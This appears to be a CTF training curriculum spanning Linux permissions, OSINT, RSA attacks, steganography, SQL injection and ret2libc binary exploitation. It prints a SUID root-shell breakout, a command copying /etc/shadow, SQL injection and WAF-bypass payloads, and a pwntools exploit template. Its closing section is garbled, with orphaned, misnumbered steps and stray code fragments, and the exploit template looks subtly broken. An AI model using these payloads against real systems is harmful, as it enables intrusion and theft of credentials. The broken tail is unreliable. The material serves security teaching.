curriculum.title: Linux CLI & Operating System Internals
curriculum.abstract: Master the Linux Virtual Filesystem architecture, kernel inode mechanics, permission octets, and SUID privilege escalation. Learn to navigate Linux environments at maximum speed using both optimized command-line pipelines and visual system explorers. Understand the low-level operating system invariants that turn simple misconfigurations into root privileges.

theory.title: POSIX VFS Architecture, Inodes & System Call Internals

sections.heading: Virtual Filesystem (VFS) Switch & Kernel Objects
sections.body:
The Linux kernel abstracts disparate physical filesystems (ext4, XFS, btrfs, tmpfs) behind a unified Virtual Filesystem Switch (VFS) layer. Every file operation initiated from user space—such as open(2), read(2), or stat(2)—is routed through kernel dispatch tables. The VFS maintains four foundational kernel data structures:

1. Superblock (struct super_block): Represents an entire mounted filesystem. Stores global parameters: filesystem magic number, allocation block size, total/free inodes, mount flags, and pointer to super_operations.
2. Inode (struct inode): Represents a unique filesystem object independent of its directory path. Identified by a 64-bit inode number unique per filesystem. Stores metadata: 16-bit file mode (type and permissions), owner UID, group GID, byte length (i_size), hard link count (i_nlink), direct/indirect block pointers, and POSIX timestamps.
3. Directory Entry (struct dentry): Associates human-readable filename strings with specific inode numbers. Cached in the kernel dentry cache (dcache) to eliminate repeated disk lookups during path resolution.
4. File Object (struct file): Created when a process opens a file via open(2). Tracks per-process file descriptor state: current file offset pointer (f_pos), access mode flags (O_RDONLY, O_NONBLOCK), and reference count.
sections.code:
# Inspect raw inode and filesystem superblock metadata
stat /usr/bin/find

# Query the kernel dentry cache and inode allocation states
cat /proc/sys/fs/dentry-state
cat /proc/sys/fs/inode-nr

# Trace directory listing system calls under the hood
strace -e getdents64 ls -la /tmp

sections.heading: POSIX Timestamps & Timestomp Forensics
sections.body:
Every filesystem inode maintains three distinct timestamps, each updated under specific kernel circumstances:

- atime (Access Time): Updated whenever a process reads file data blocks via read(2) or execve(2). Filesystems mounted with 'noatime' or 'relatime' optimize this to minimize write amplification.
- mtime (Modification Time): Updated whenever file contents are written or truncated via write(2). This is the standard 'last modified' date seen in basic file listings.
- ctime (Change Time): Updated whenever inode metadata changes (chmod, chown, hard link creation) OR whenever file contents change. CRITICALLY: User-space programs cannot set ctime arbitrarily (the touch utility cannot alter ctime). The kernel sets ctime to current system time on every metadata mutation. When an adversary timestomps a file using 'touch -d', mtime and atime are rewritten, but ctime advances to the current moment—creating an irrefutable forensic anomaly where mtime is older than ctime.
sections.code:
# Full-precision nanosecond ISO timestamp examination
ls -la --time-style=full-iso /bin/bash

# Forensic timestamp audit identifying timestomped files
stat malicious_binary
# Anomaly indicator: if Modify is 2021-01-01 and Change is 2026-09-30,
# the file was timestomped or modified in 2026.

sections.heading: Permission Model: Octets, SUID/SGID & Sticky Bits
sections.body:
Linux permissions are represented as 16-bit bitmasks. The lowest 9 bits define read (4), write (2), and execute (1) permissions across User, Group, and Other. The higher nibble encodes special privilege bits:

- SetUID (Bit 04000 / 4755): When executed, the operating system assigns the process the effective user ID (eUID) of the file's owner rather than the executing caller. If owned by root (UID 0), the binary executes with supreme kernel authority (e.g., /usr/bin/passwd).
- SetGID (Bit 02000 / 2755): Assigns the effective group ID of the file's owning group to the process. When applied to directories, files created inside inherit the parent directory's group.
- Sticky Bit (Bit 01000 / 1777): Applied to shared writable directories (/tmp). Restricts file deletion or renaming exclusively to the file owner or root, regardless of directory write permissions.

GTFOBins Catalog: If an administrative utility, text editor, or interpreter (find, cp, python, bash, vi) is inadvertently configured with the SetUID root bit, attackers invoke built-in execution or file-access parameters to bypass access controls and spawn root shells.
sections.code:
# Find all SUID binaries on the system (redirect errors to null)
find / -perm -4000 -type f 2>/dev/null

# Classic SUID find root shell breakout
/usr/local/bin/find . -exec /bin/sh -p \; -quit

# SUID cp arbitrary file read (exfiltrating password hashes)
/usr/bin/cp /etc/shadow /tmp/shadow_copy && cat /tmp/shadow_copy

curriculum.title: Open Source Intelligence (OSINT) & Reconnaissance
curriculum.abstract: Master passive intelligence gathering, document metadata extraction, DNS protocol recon, and Certificate Transparency log harvesting. Learn how digital images betray operational security through EXIF tag IFDs, rational GPS encoding, and embedded camera device signatures.

theory.title: Passive Reconnaissance & Binary Image Metadata Standards

sections.heading: MITRE ATT&CK TA0043 & Passive Reconnaissance Frameworks
sections.body:
Passive reconnaissance gathers actionable intelligence without generating direct network packets toward the target infrastructure. Under MITRE ATT&CK TA0043, key passive techniques include:

- T1596 (Search Open Technical Databases): Querying internet scan engines (Shodan, Censys, SecurityTrails, VirusTotal) to enumerate open ports, SSL certificates, and software banners.
- T1593.002 (Search Social Media Services): Harvesting employee directories on LinkedIn and technical discussions on GitHub, Reddit, and StackOverflow.
- T1590 (Gather Victim Network Information): Querying DNS records and Certificate Transparency logs.

Because third-party aggregation databases cache target telemetry, passive reconnaissance leaves zero footprint in the target organization's firewall or SIEM logs.
sections.code:
# Query Certificate Transparency logs for subdomains (no target packets)
curl -s 'https://crt.sh/?q=%.target.corp&output=json' | jq -r '.[].name_value' | sort -u

# Query public DNS servers for TXT and MX records
dig +short TXT target.corp @8.8.8.8
dig +short MX target.corp @1.1.1.1

sections.heading: EXIF Standard Architecture & IFD Tag Identifiers
sections.body:
The Exchangeable Image File Format (EXIF 2.32) embeds structured metadata within JPEG, TIFF, and HEIC containers using TIFF-structured Image File Directories (IFDs). Key binary header fields:

- Byte Order Mark: 0x4949 ('II', Intel Little-Endian) or 0x4D4D ('MM', Motorola Big-Endian).
- Magic TIFF identifier: 0x002A (42).
- Each IFD field consists of 12 bytes: Tag ID (2 bytes), Type (2 bytes: BYTE, ASCII, SHORT, LONG, RATIONAL), Count (4 bytes), and Value/Offset (4 bytes).

Critical EXIF Tag IDs:
- 0x010F: Camera Manufacturer (Make)
- 0x0110: Camera Model
- 0x9003: DateTimeOriginal (capture timestamp)
- 0x8825: GPSInfo IFD Pointer (offset to sub-directory containing coordinates)
- Within GPS IFD: 0x0001 GPSLatitudeRef ('N'/'S'), 0x0002 GPSLatitude (3 RATIONALs: degrees, minutes, seconds), 0x0003 GPSLongitudeRef ('E'/'W'), 0x0004 GPSLongitude.
sections.code:
# Display all metadata including hidden vendor MakerNotes
exiftool -a -u image.jpg

# Extract GPS coordinates formatted as decimal degrees
exiftool -gps:all -c '%.6f' photo.jpg

# Strip all EXIF metadata completely to protect privacy (OPSEC)
exiftool -all= photo.jpg

sections.heading: DNS Protocol RFC 1035 & Zone Transfer (AXFR) Reconnaissance
sections.body: DNS operates primarily over UDP/53 for standard queries and TCP/53 for responses exceeding 512 bytes or zone transfers. In an Authoritative Zone Transfer (AXFR, Opcode 252), a secondary nameserver requests a full copy of the DNS zone database from the master nameserver. If misconfigured, an external attacker issues an AXFR query to immediately download the entire organizational infrastructure topology (internal IP addresses, staging servers, VPN endpoints).
sections.code:
# Attempt full DNS Zone Transfer via TCP/53
dig axfr @ns1.target.corp target.corp

# Query DNS ANY records to elicit multi-record responses
dig ANY target.corp @8.8.8.8

curriculum.title: Cryptography & Mathematical Foundations
curriculum.abstract: Deep-dive into asymmetric RSA primitives, modular arithmetic, Euler's totient function, and the Extended Euclidean Algorithm. Master the three catastrophic RSA vulnerability classes: small public exponent without OAEP, Fermat's factorization on close primes, and Wiener's continuous fraction attack on small private exponents.

sections.heading: RSA Key Generation & Mathematical Proof
sections.body:
The security of RSA rests upon the integer factorization problem: computing n = p * q is trivial, but finding p and q from n alone is computationally intractable for sufficiently large random primes.

1. Prime Selection: Choose distinct secret prime numbers p and q (typically 1024 or 2048 bits).
2. Modulus Computation: Compute public modulus n = p * q.
3. Euler's Totient: Compute phi(n) = (p - 1) * (q - 1).
4. Public Exponent e: Select integer e such that 1 < e < phi(n) and gcd(e, phi(n)) = 1. Standard choice is e = 65537 (0x10001 = 2^16 + 1, low Hamming weight enables fast square-and-multiply exponentiation).
5. Private Exponent d: Compute the modular multiplicative inverse of e modulo phi(n): e * d = 1 (mod phi(n)), solved using the Extended Euclidean Algorithm.

Encryption: c = m^e (mod n)
Decryption: m = c^d (mod n)
sections.code:
# Python standard RSA key generation
from Crypto.Util.number import getPrime, inverse
import math

p = getPrime(512)
q = getPrime(512)
n = p * q
phi = (p - 1) * (q - 1)
e = 65537
d = inverse(e, phi)

# Encrypt and Decrypt
m = int.from_bytes(b'CTF Atlas', 'big')
c = pow(m, e, n)
plain = pow(c, d, n)
print(plain.to_bytes((plain.bit_length() + 7) // 8, 'big').decode())

sections.heading: Vulnerability Class 1: Small Public Exponent (e=3) Cube Root Attack
sections.body:
When textbook RSA is implemented without padding (such as PKCS#1 v2.1 OAEP) and public exponent e=3 is used, if the plaintext message m is short, m^3 may be smaller than the modulus n (m^3 < n).

When m^3 < n, modular reduction never occurs: c = m^3 mod n = m^3.
An attacker computes the standard integer cube root of c over the real numbers: m = round(c^(1/3)). No knowledge of p, q, or d is necessary. OAEP padding mitigates this by expanding and randomizing the plaintext before exponentiation.
sections.code:
# Exploiting textbook unpadded RSA with e=3
import gmpy2

c = 343478107279667757 # Ciphertext
m, exact = gmpy2.iroot(c, 3)
if exact:
    flag = m.to_bytes((m.bit_length() + 7) // 8, 'big')
    print('Plaintext:', flag.decode())

sections.heading: Vulnerability Class 2: Fermat's Factorization (Close Primes)
sections.body:
If prime numbers p and q are chosen too close together (|p - q| < 2 * n^(1/4)), n can be rapidly factored using Fermat's algorithm. Observing that every odd integer n can be represented as the difference of two squares: n = a^2 - b^2 = (a - b)(a + b).

Let a = ceil(sqrt(n)). Calculate b^2 = a^2 - n. If b^2 is a perfect square, then p = a - b and q = a + b. If not, increment a and repeat. When p and q are close, the loop terminates in milliseconds.

curriculum.title: Steganography & Digital Forensics
curriculum.abstract: Analyze digital media headers, magic byte signatures, EOF slack space injection, and spatial Least Significant Bit (LSB) encoding. Master binary carving with binwalk and hex inspection to uncover concatenated archive files hiding in plain sight.

theory.title: File Signatures, EOF Slack Space & Shannon Entropy

sections.heading: Magic Bytes & File Header Architecture
sections.body:
Operating systems and forensic analysis tools identify file types by verifying fixed magic byte signatures at designated byte offsets rather than trusting file extensions:

- PNG: 89 50 4E 47 0D 0A 1A 0A (hex) - An 8-byte signature designed to catch DOS-to-Unix CRLF conversion corruptions.
- JPEG: FF D8 FF (Start of Image marker) ... terminating with FF D9 (End of Image).
- ZIP Archive: 50 4B 03 04 ('PK', Local File Header) and 50 4B 05 06 (End of Central Directory record).
- ELF Executable: 7F 45 4C 46 (0x7F 'ELF').
- PDF Document: 25 50 44 46 ('%PDF').

When multiple valid magic signatures appear in a single file stream, it indicates a compound file or embedded payload.
sections.code:
# Inspect raw magic bytes using xxd
xxd -p -l 8 mystery_file

# Reliable file identification bypassing spoofed extensions
file --mime-type target_artifact

sections.heading: End-of-File (EOF) Slack Space Concatenation
sections.body:
Image format decoders parse byte streams sequentially according to chunk markers:
- In PNG files, the IEND chunk (bytes: 49 45 4E 44 AE 42 60 82) signals the complete conclusion of the image structure. Any data bytes appended after the IEND chunk are ignored by image viewers.
- In JPEG files, all data following the FF D9 (EOI) marker is disregarded by graphics engines.

Adversaries exploit this by appending arbitrary files (ZIP archives, encrypted scripts, flags) to the end of legitimate images. Because ZIP files locate their Central Directory index from the end of the file backwards, an appended ZIP archive remains fully functional and extractable with standard unzip or binwalk tools.
sections.code:
# Identify embedded signatures inside image containers
binwalk -B artifact.png

# Extract trailing data after PNG IEND chunk using python
python3 -c '
with open("artifact.png", "rb") as f: data = f.read()
iend = data.rfind(b"IEND") + 8
with open("carved.zip", "wb") as f: f.write(data[iend:])
'

sections.heading: Shannon Entropy & LSB Steganography
sections.body:
Shannon Entropy H = -sum(p(x) * log2(p(x))) quantifies the randomness of byte distributions in a file. Natural text has low entropy (~3-4 bits/byte); structured code has moderate entropy (~5 bits/byte); compressed archives and encrypted streams approach maximum entropy (~8 bits/byte).

Spatial LSB Steganography: Overwrites the least significant bit of 8-bit RGB color bytes. Since altering 1 bit shifts the color value by at most 1/255th, the change is visually imperceptible to the human eye, but can be mathematically exposed by bit-plane slicers or entropy variance scans.
sections.code:
# Generate entropy distribution visualization graph
binwalk -E artifact.png

# High spikes approaching 1.0 (8.0 bits/byte) indicate encrypted/compressed data

curriculum.title: Web Application Exploitation
curriculum.abstract: Explore modern web application attacks, HTTP protocol mechanics, Abstract Syntax Tree (AST) SQL injection manipulation, and Web Application Firewall (WAF) evasion. Learn to transition seamlessly between GUI intercept proxies (Burp Suite) and command-line automation pipelines (curl, sqlmap).

theory.title: HTTP Protocols, SQL Injection AST Alteration & WAF Evasion

sections.heading: HTTP/1.1 vs HTTP/2 & Request Parsing Mechanics
sections.body:
HTTP/1.1 is a plaintext protocol parsed sequentially with CRLF delimiters:
- Request Line: METHOD URI HTTP/1.1\r\n
- Headers: Key: Value\r\n
- Body separator: \r\n\r\n

Security-sensitive headers:
- Host: Evaluated for virtual host routing (enables HTTP Host Header Poisoning).
- X-Forwarded-For: Client IP spoofing when reverse proxies fail to strip upstream headers.
- Content-Length vs Transfer-Encoding: Discrepancies cause HTTP Request Smuggling.

HTTP/2 replaces plaintext with binary framing (HEADERS and DATA frames) and HPACK compression. Exploitation often targets the translation boundary where an HTTP/2 front-end translates requests to HTTP/1.1 back-ends.
sections.code:
# Manual HTTP request inspection using curl
curl -v -X POST http://target.local/api/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":"pass"}'

sections.heading: SQL Injection: Abstract Syntax Tree (AST) Alteration
sections.body:
SQL injection occurs when untrusted input is concatenated into database queries rather than bound as parameterized data. The input breaks out of the data literal context and adds new nodes to the database engine's Abstract Syntax Tree (AST).

Primary SQLi Classes:
1. In-Band UNION-based: Appends result sets from arbitrary tables using UNION SELECT. Requires equal column counts and matching data types.
2. Error-based: Exploits runtime errors (e.g. extractvalue, updatexml in MySQL) to reflect data inside database error messages.
3. Boolean Blind: Extracts data bit-by-bit by observing binary true/false application responses (e.g. ' AND SUBSTRING(version(),1,1)='8'--).
4. Time-based Blind: Infers data when true conditions trigger sleep commands (e.g. ' AND IF(version() LIKE '8%', SLEEP(5), 0)--).
sections.code:
# UNION-based enumeration
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--

# Time-based blind injection test
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=97, SLEEP(3), 0)--

sections.heading: Modern WAF Evasion Techniques
sections.body:
Web Application Firewalls inspect HTTP requests using regular expressions. Evasion exploits semantic equivalences that the database engine parses successfully but the WAF regex fails to match:

- Comment Obfuscation: In MySQL, inline comments /**/ replace whitespace. Versioned comments /*!50000SELECT*/ execute on MySQL versions >= 5.0.0 while looking like comments to basic WAFs.
- Character Encoding: Double URL encoding (%2527 for '), Unicode full-width equivalents, or hex literals (0x61646d696e for 'admin').
- Whitespace Substitution: Using tabs (%09), newlines (%0A), carriage returns (%0D), or parentheses: SELECT(username)FROM(users).
sections.code:
# WAF bypass using MySQL inline comments
'/*!50000UNION*//*!50000SELECT*/1,token,3/**/FROM/**/secrets--

curriculum.title: Binary Exploitation (Pwn) & Reverse Engineering
curriculum.abstract: Master x86/x64 process virtual address spaces, stack frame layout, and modern kernel mitigations (ASLR, NX, Canaries, RELRO). Learn Return-Oriented Programming (ROP) and ret2libc attack chains to seize control of execution flow without shellcode injection.

theory.title: Virtual Address Space Layout, Stack Exploitation & ret2libc

sections.heading: Process Address Space & Memory Segments
sections.body:
In 64-bit Linux architectures, each user-space process runs inside a 48-bit canonical virtual address space (0x0000000000000000 to 0x00007FFFFFFFFFFF):

- .text Segment: Contains compiled machine instructions. Mapped with Read + Execute (r-x) permissions.
- .rodata: Read-only string literals, jump tables, and global constants.
- .data / .bss: Initialized (.data) and uninitialized (.bss) global and static variables. Mapped Read + Write (rw-).
- Heap: Dynamically allocated memory via brk(2) or mmap(2). Grows upward toward higher addresses.
- Stack: Function frames, local variables, saved frame pointers (RBP), and return addresses (RIP). Grows downward toward lower addresses.
- Shared Libraries (libc.so): Dynamic runtime libraries mapped into the high memory region.
sections.code:
# Inspect memory mappings of a running process
cat /proc/$PID/maps

# Or inside GDB with GEF/pwndbg
(gdb) vmmap

sections.heading: Stack Frame Anatomy & Return Address Overwrite
sections.body:
When a function is called in System V AMD64 ABI:
1. Caller places arguments in RDI, RSI, RDX, RCX, R8, R9. Remaining arguments pushed to stack.
2. CALL instruction pushes the next instruction address (Return Address / RIP) onto the stack.
3. Callee Prologue:
   push rbp        # Save caller's base pointer
   mov rbp, rsp    # Set current stack frame base
   sub rsp, 0x40   # Allocate stack storage for local variables

Memory layout on stack from low to high:
[Local Buffer] -> [Saved RBP (8 bytes)] -> [Return Address (8 bytes)]

Stack Buffer Overflow: If an unbounded input function (gets, strcpy, read without size limits) writes more bytes than allocated for the buffer, input data overflows past the buffer boundaries, overwrites Saved RBP, and completely overwrites the Return Address. When the function executes 'ret', the CPU pops the attacker's value into RIP, seizing control of execution.
sections.code:
# In GDB with GEF: calculate exact crash offset
(gdb) pattern create 128
(gdb) run
# [Program crashes at invalid RIP]
(gdb) pattern offset $rsp

sections.heading: Modern Mitigations & ret2libc Exploitation
sections.body:
Modern systems deploy layered compiler and kernel protections:
- NX / DEP (No-Execute): Marks stack and heap memory as non-executable. Injected shellcode cannot execute.
- Stack Canary: Places a random secret value directly before Saved RBP. Verified before 'ret'; mismatch triggers __stack_chk_fail termination.
- ASLR: Randomizes base addresses of stack, heap, and shared libraries at execution time.
- RELRO: Partial RELRO makes GOT entries writable; Full RELRO resolves all symbols at startup and marks GOT read-only.

ret2libc (Return-to-libc): Bypasses NX completely. Rather than injecting shellcode, the attacker constructs a Return-Oriented Programming (ROP) chain that redirects execution to existing libc code:
1. Populate RDI register with the address of '/bin/sh' string in libc using a 'pop rdi; ret' gadget.
2. Call system() function in libc.
sections.code:
# Python pwntools ret2libc exploit template
from pwn import *

elf = ELF('./vuln_service')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln_service')

pop_rdi = 0x401234 # pop rdi; ret
ret = 0x401235     # stack alignment

payload = b'A' * 136
payload += p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()

While NX prevented stack shellcode, ASLR was disabled and partial RELRO left libc functions reachable. By calculating the 136-byte offset to RIP, an exploit constructed a ret2libc chain calling system('/bin/sh').

2. Calculate RIP offset: gdb pattern -> crashes at 136 bytes

4. Find addresses: system() in libc and '/bin/sh' string
5. Assemble exploit payload: 136*'A' + ret + pop_rdi + binsh + system
6. Execute payload -> drops into interactive shell
7. Capture flag: cat /flag.txt -> CTF{R3T2L1BC_NX_BYP4SS_PWN3D}

# ROP: pop_rdi (0x401234) -> &'/bin/sh' -> system()

padding = b'A' * 136
pop_rdi = struct.pack('<Q', 0x401234)
